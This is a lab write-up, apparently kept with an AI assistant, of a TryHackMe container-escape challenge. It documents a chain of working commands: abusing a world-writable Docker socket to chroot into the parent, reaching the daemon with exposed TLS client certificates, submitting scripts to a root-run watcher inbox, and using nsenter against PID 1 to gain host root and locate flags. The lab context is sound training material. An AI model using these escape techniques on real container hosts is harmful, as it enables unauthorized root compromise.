# Matryoshka Containment Unit — Checkpoint

**Status:** Paused after read-only reconnaissance; level1 identified, further layers unknown  
**Recorded:** 2026-11-23 (America/Detroit)  
**Source:** User-pasted TryHackMe lab introduction, terminal outputs, and conversational corrections. Outputs are attributed to the user’s lab terminal rather than independently reproduced.  
**Purpose:** Resume checkpoint and DERP evidence preservation, not a completed escape claim.

## Lab introduction

> Matryoshka Containment Unit  
> You set up a containment unit designed to trap and contain even the most nefarious viruses, but you accidentally got trapped in it while testing it.  
> Your memory is fuzzy, and you don't remember much about how you set it up.  
> Good luck!

The title prompted a nesting-doll analogy; whether there are multiple nested Docker daemons/containers remains **unverified**. The user suggested a more entertaining *Inception* countdown timer per layer as a design joke, not an implemented feature.

## Target and initial observed environment

SSH target for the resumed lab: `matryoshka@10.64.178.175` (ephemeral lab address; do not presume future persistence).

Observed prompt: `0314815ce7da:~$`.

| Property | User-observed value | Classification |
| --- | --- | --- |
| Identity | `uid=1000(matryoshka) gid=1000(matryoshka) groups=1000(matryoshka)` | Observed |
| Hostname | `0314815ce7da` | Observed |
| Kernel | `6.17.0-1013-aws` | Observed |
| PID 1 | `sleep infinity` | Observed |
| Container marker | `/.dockerenv` present | Observed |
| Cgroup | `0::/`; cgroup2 mounted | Observed |
| CapEff / CapPrm | `0000000000000000` | Observed |
| CapBnd | `00000000a80425fb` | Observed |
| User namespace | `user:[4026531837]` | Observed |
| UID/GID mappings | `0 0 4294967295` for both | Observed |
| Root filesystem reported by `/proc/mounts` | `/dev/root / ext4` | Observed |
| Installed utilities | Docker, `unshare`, `nsenter`; `findmnt` missing | Observed |

## Docker socket and daemon

Socket exists at `/run/docker.sock` and is `srw-rw-rw-` (mode 0666), owned by root and GID 2375. `/var/run` links to `/run`.

Docker client version: `26.1.5`. Default Docker context endpoint: `unix:///var/run/docker.sock`.

Daemon information returned successfully from the unprivileged shell:

- Name: `d275346ac26e`
- Server version: `25.0.5`
- Docker root directory: `/var/lib/docker`
- Storage driver: `vfs`
- Reported security options: `apparmor`, `seccomp,profile=builtin`, `cgroupns`

This **confirms usable Docker API access from an unprivileged container account**, but does not by itself prove outer-host control or a completed escape.

## Context correction: accidental SSH disconnect

An earlier SSH session to `10.64.148.193` closed, returning to prompt `root@ip-10-64-80-225:~#`. Docker inventory there included `revshellgenerator` and `cyberchef`; **those entries belong to the outer AttackBox context and are not Matryoshka level1 evidence**. The user then reconnected to `matryoshka@10.64.178.175`, restoring prompt `0314815ce7da:~$`.

Preserve the distinction between the two execution contexts when resuming.

## Verified inventory after reconnecting to Matryoshka

```text
CONTAINER ID   NAMES     IMAGE                     STATUS
0314815ce7da   level1    matryoshka-level1:local   Up 7 minutes
```

Available images: `matryoshka-level1:local` (`485e908211ec`) and `alpine:3.20` (`bf8527eb54c3`). Networks: `bridge`, `host`, `none`. No volumes listed.

### `docker inspect level1` observations

```text
Name: /level1
Image: matryoshka-level1:local
User: matryoshka
Privileged: false
PID Mode:
Network Mode: none
Readonly Rootfs: false

Mounts:
[{"Type":"bind","Source":"/var/run/docker.sock","Destination":"/var/run/docker.sock","Mode":"","RW":true,"Propagation":"rprivate"}]

Capabilities Added: null
Security Options: null
```

**Core finding:** The nonprivileged `level1` container with no Docker network has a writable bind mount of the managing Docker socket. This is a significant isolation weakness; available daemon operations and containment depth need separate verification. `CapAdd: null` describes no explicitly added capabilities, not the entire effective-capability state (which was observed separately as zero).

Mount anomaly noted: `/proc/mounts` displayed an overlay mount at `/run/docker.sock`, whereas `docker inspect` describes a bind mount at `/var/run/docker.sock`. The two paths resolve together through the symlink, but the underlying layered mount arrangement was not investigated further.

## Checkpoint and next action

- **Confirmed:** Level 1 is `0314815ce7da`, image `matryoshka-level1:local`, Docker name `level1`; daemon reachable; RW socket bind mount.
- **Not confirmed:** Number of nested layers, daemon's relationship to the outer host, any privilege escalation or escape, any flag, challenge completion.
- **Environment:** Lab user `matryoshka`; terminal prompt `0314815ce7da:~$`. Confirm prompt and session after any disconnect before interpreting new output.
- **Next:** Resume with read-only analysis of level boundaries and lab objectives, explicitly tracking execution context. Avoid treating the AttackBox's unrelated Docker inventory as target evidence.
- **Workflow:** GitHub is the canonical versioned record. Obsidian local pull/sync not verified at checkpoint.

No target files, containers, networks, or Docker daemon settings were changed during the documented checks.

---

## Session continuation — Level 2 investigation, 2026-11-23

**Event:** Follow-up tests performed in the user's TryHackMe lab; target machine subsequently turned off. Exact shutdown cause (expiry versus other termination) was not established. Live shell and ephemeral container/network state must be treated as lost until independently restored. **Do not claim Level 3 reached or the challenge completed.**

### Level 1 → Level 2 technique demonstrated

From the Level 1 shell, the user executed the walkthrough-style Docker socket technique using the available pinned Alpine image:

```sh
docker run -v /:/mnt --rm -it alpine:3.20 chroot /mnt sh
```

A shell appeared with `id` showing `uid=0(root)`, hostname `cc56256331da`, and bridge IP `172.17.0.2/16`. Docker later identified this temporary sibling container as `laughing_galois`. The chroot exposed the managing daemon environment's filesystem; **the shell still retained the helper container's own PID, network, and other namespace restrictions**. It was not verified as an outermost host shell.

`/proc/1/cmdline` in this environment exposed `/bin/sh /usr/local/bin/level2-entrypoint.sh`. The user read the script. Its relevant exact operations were:

```sh
dockerd-entrypoint.sh --storage-driver=vfs > /var/log/dockerd.log 2>&1 &
until docker info > /dev/null 2>&1; do sleep 1; done
chmod 666 /var/run/docker.sock
if [ ! -f /root/flag_level2.txt ]; then
    echo "$LEVEL2_FLAG" > /root/flag_level2.txt
    chmod 400 /root/flag_level2.txt
fi
docker image inspect matryoshka-level1:local >/dev/null 2>&1 || docker load -i /opt/images/level1-image.tar >/dev/null
docker image inspect alpine:3.20 >/dev/null 2>&1 || docker load -i /opt/images/alpine-3.20.tar >/dev/null
docker rm -f level1 >/dev/null 2>&1 || true
docker run -d --pull=never --name level1 --network none -v /var/run/docker.sock:/var/run/docker.sock matryoshka-level1:local >/dev/null
tail -f /dev/null
```

The script explicitly calls the `chmod 666` operation a `Level 1 -> Level 2 vuln`. The flag file was confirmed by directory listing as `/root/flag_level2.txt`, root-owned mode 0400, 20 bytes. **Flag contents were not documented in the terminal evidence.**

`/usr/local/bin/attach_level1.sh` was inspected and contains `exec docker exec -it level1 /bin/bash`. In `/opt/images`, `alpine-3.20.tar` (3.6 MB) and `level1-image.tar` (16 MB) are image archives used by the entrypoint, **not evidence of a separate Level 3 container**.

### Local Docker daemon and authenticated TLS endpoint

Level 2's process list showed:

```text
dockerd --host=unix:///var/run/docker.sock --host=tcp://0.0.0.0:2376 --tlsverify --tlscacert /certs/server/ca.pem --tlscert /certs/server/cert.pem --tlskey /certs/server/key.pem --storage-driver=vfs
```

The `/certs/client/` directory contained `ca.pem`, `cert.pem`, `csr.pem`, `key.pem`, and `openssl.cnf`. Client key was mode 0644. `DOCKER_*` environment variables were absent from the current shell.

Attempts to reach ports 2375 failed. TLS request to `172.17.0.1:2376` reached certificate verification but failed with:

```text
x509: certificate is valid for 127.0.0.1, 172.18.0.2, not 172.17.0.1
```

Using the certificate-covered address succeeded:

```sh
docker --host tcp://172.18.0.2:2376 --tlsverify --tlscacert /certs/client/ca.pem --tlscert /certs/client/cert.pem --tlskey /certs/client/key.pem version
```

Server was Docker Engine 25.0.5 / API 1.44. Comparison of TLS and local Unix socket `docker info` returned identical daemon identity `d275346ac26e`, Docker Root `/var/lib/docker`, and two managed containers. At that point `docker ps` listed `level1` and `laughing_galois`. `docker exec level1 id` returned UID 1000; authenticated remote `docker ... exec level1 ls -la /home/matryoshka` succeeded. This establishes **two working interfaces to the same Level 2 daemon**, not a Level 3 daemon.

`docker info --format '{{json .Plugins.Authorization}}'` returned `null` (no reported Docker authorization plugin); security options were AppArmor, builtin seccomp, and cgroupns. No evidence found of distinct API authorizations across the two interfaces.

### Process and service audit

Observed Level 2 PID 1: `level2-entrypoint.sh`. Other processes included `dockerd` (PID 103), `containerd` (111), Level 1 `sleep infinity` (330), Level 2 keepalive `tail -f /dev/null` (354), and temporary helper shell `sh` (616). The helper's `ss -lntup` showed no listeners, despite working remote TLS connectivity; **process visibility and network namespace views differ**.

### Capabilities, seccomp, nsenter attempt

A previous lesson's namespace command was attempted from the root helper:

```sh
nsenter --target 1 --mount --uts --ipc --net /bin/bash
```

It failed repeatedly with `nsenter: cannot open /proc/1/ns/ipc: Permission denied`. `readlink /proc/1/ns/{mnt,uts,ipc,net,pid,user,cgroup}` returned no link targets, and reading `/proc/1/root` link yielded permission denied. Merely having UID 0 inside the helper did not grant access to those namespace handles.

Process-security comparison:

| Property | Level 2 PID 1 | Temporary Alpine helper |
| --- | --- | --- |
| UID | 0 | 0 |
| CapPrm / CapEff / CapBnd | `00000000a82c35fb` | `00000000a80425fb` |
| CapInh / CapAmb | Zero | Zero |
| Seccomp | `0` | `2` |
| Seccomp_filters | `0` | `1` |
| NoNewPrivs | `0` | `0` |

Capability bitmask comparison indicates Level 2 PID 1 possesses `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_NET_ADMIN` absent in helper. Exact parent Docker `Privileged` setting **not established**. `nsenter` was attempted but did not enter a namespace, so the technique was **not demonstrated successful**.

### OverlayFS and mount propagation — unresolved lead

Read-only `/proc/1/mountinfo` and `/proc/self/mountinfo` comparisons showed the same underlying overlay device `0:47` and root filesystem but different propagation descriptors:

```text
Level 2 PID 1 root: 523 385 0:47 / / rw,relatime shared:218 master:216 - overlay overlay ...
Helper shell root: 610 602 0:47 / / rw,relatime master:218 - overlay overlay ...
```

This documents different mount namespace propagation views. **Overlay lowerdir entries are filesystem/image layers, not a count of Matryoshka container levels.** No evidence established that propagation itself provides an escape or Level 3 access. User hypothesized OverlayFS / unprivileged namespace settings might be relevant. Planned follow-up to compare UID/GID namespace mappings and mount relationships was interrupted by machine shutdown.

### Resume and classification

- **Confirmed:** Level 1 socket exposure, Level 2 filesystem/entrypoint and flag *location*, successful root helper chroot, remote Docker TLS endpoint, same daemon via TLS and Unix socket, remote `docker exec`, differences in process capabilities/seccomp, observable mount-propagation difference.
- **Failed or unverified:** `nsenter` from helper; exact Level 2 parent Docker settings; Level 3 environment and vulnerability; Level 2 flag *contents*; any complete challenge escape; machine shutdown cause.
- **Do not confuse:** AttackBox `revshellgenerator` / `cyberchef` inventory with target; local and TLS endpoints with separate daemons; `laughing_galois` (sibling helper) with a new outer layer; `chroot` with namespace entry.
- **On restart:** Verify target address, prompt, container IDs and daemon identity afresh; ephemeral IPs `10.64.178.175`, `172.17.0.2`, `172.18.0.2` and container IDs are historical, not guaranteed. Rebuild only necessary access and focus new investigation on Level 2's **parent** security context, with careful attribution of which namespace each observation comes from.


---

## Final session closeout — Level 3 and host, 2026-11-23

**Provenance:** User-supplied TryHackMe terminal output and uploaded walkthrough screenshot; prior sections remain historically accurate for their earlier checkpoints. The lab machine restarted during investigation, changing ephemeral identifiers. New Level 1 hostname was 3780305806c5; a temporary Alpine helper reported c3bdcb1238cc; the new Docker daemon ID was 17cd1015381d. These values do not overwrite earlier identities.

### Level 2 → Level 3: monitored shared inbox

Level 2 contained world-writable /mnt/level3share/inbox and /mnt/level3share/outbox, mounted as an overlay, with a watcher that picked up submitted shell files. Submission of identity-check.sh was consumed before chmod could run. Its output reported that the watcher-side path /mnt/level3share/outbox did not exist. The watcher-side equivalent is /level3share/outbox, so later scripts wrote to standard output instead of redirecting to an assumed directory.

Working dispatch and response pattern:

~~~sh
cat > /mnt/level3share/inbox/identity-check2.sh <<'EOF'
#!/bin/sh
whoami
id
EOF
cat /mnt/level3share/outbox/identity-check2.sh.out
~~~

Returned:

~~~text
root
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
~~~

The transient /tmp/runner_find-host-flag.sh was the watcher's renamed execution copy of our submitted script, not a hidden challenge script. This distinction resolved a misinterpretation during reconnaissance.

### Level 3 flag and failed host searches

Watcher-context find searches found /root/flag_level3.txt and nested Docker overlay/VFS files, including a copy of Level 2's /root/flag_level2.txt under /var/lib/docker/overlay2/.../merged/. A subsequent watcher script read /root/flag_level3.txt, and the user confirmed 'got it'. **Literal flag contents were not pasted into the conversation.** Searches for names or paths containing spaces revealed no host flag because these searches were still in Level 3's mount namespace. Echo's suggestion of a space-containing host path was not confirmed by later evidence.

### Level 3 prerequisites and namespace evidence

The watcher identified as hostname f88dd1e0f27f, UID 0, with nsenter at /usr/bin/nsenter. BusyBox ps did not support the -p option, a tooling issue only. The watcher process and PID 1 had the same PID namespace pid:[4026531836] but different mount namespaces: watcher mnt:[4026532239], PID 1 mnt:[4026531832]. The UTS and network namespaces also differed. The watcher reported:

~~~text
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
Seccomp: 0
~~~

A user-provided walkthrough screenshot described a privileged Level 3 container sharing the host PID namespace and recommended entering PID 1's namespaces. The lab's subsequent independent output verified the transition.

### Final namespace transition — confirmed host execution

A file submitted to the Level 2 inbox was executed by the Level 3 watcher, which invoked:

~~~sh
nsenter -t 1 -a -- sh -c '
    echo "Hostname:"
    hostname
    echo "Identity:"
    id
    echo "Root filesystem:"
    findmnt -n -o SOURCE,TARGET /
'
~~~

The user pasted the exact resulting output:

~~~text
=== HOST NAMESPACE TEST ===
Hostname:
matryoshka
Identity:
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
Root filesystem:
/dev/nvme0n1p1 /
=== COMPLETE ===
~~~

**Verified finding:** The process entered host namespaces and executed as root on the outer host with hostname matryoshka and root filesystem /dev/nvme0n1p1. The earlier Level 2 helper had failed a similar nsenter attempt due to insufficient privileges; Level 3's elevated capabilities and shared PID namespace were the crucial difference.

### Host flag location and retrieval provenance

The final search was dispatched through the watcher, but the search itself ran after entering the host namespaces:

~~~sh
nsenter -t 1 -a -- sh -c 'find / -type f -iname "*flag*" 2>/dev/null'
~~~

The user reported /root/flag_host.txt as the result (typed root/flag_host.txt in the conversation). The assistant then supplied the following retrieval command:

~~~sh
cat > /mnt/level3share/inbox/read-host-flag.sh <<'EOF'
#!/bin/sh
nsenter -t 1 -a -- cat "/root/flag_host.txt"
EOF
cat /mnt/level3share/outbox/read-host-flag.sh.out
~~~

**Verified:** host root shell execution; host flag path user-reported. **Not independently visible in conversation:** host flag contents, final command output, or a TryHackMe submission/completion confirmation. Do not fabricate those records or claim the final flag value was captured. User then moved to the next course section, 'Planning and Scoping'.

### DERP lessons and final state

1. Level 1: Unprivileged container had a world-writable Docker socket despite disabled container networking.
2. Level 2: Sibling Alpine plus root bind mount and chroot exposed Level 2 files; chroot was not equivalent to switching namespaces. Remote TLS and local Unix-socket Docker APIs were the same Level 2 daemon, not separate escalation paths.
3. Level 3: World-writable shared inbox was monitored by a root-executing watcher; results were captured via matching outbox .sh.out files. Filesystem paths differed across namespaces.
4. Host: Privileged Level 3, with host PID namespace access, permitted nsenter against PID 1 and verified execution on the outer host.
5. Evidence discipline: container root is not automatically host root; failed searches were constrained by the current mount namespace; retain ephemeral context, observed outputs, failed attempts, and unverified flags separately.

**Closeout classification:** Technical escape chain to the outer host **confirmed**. Level 3 flag retrieval **user-confirmed**. Host flag location **user-reported**; value and challenge submission **unverified in the transcript**. GitHub is canonical; local Obsidian sync was not verified.
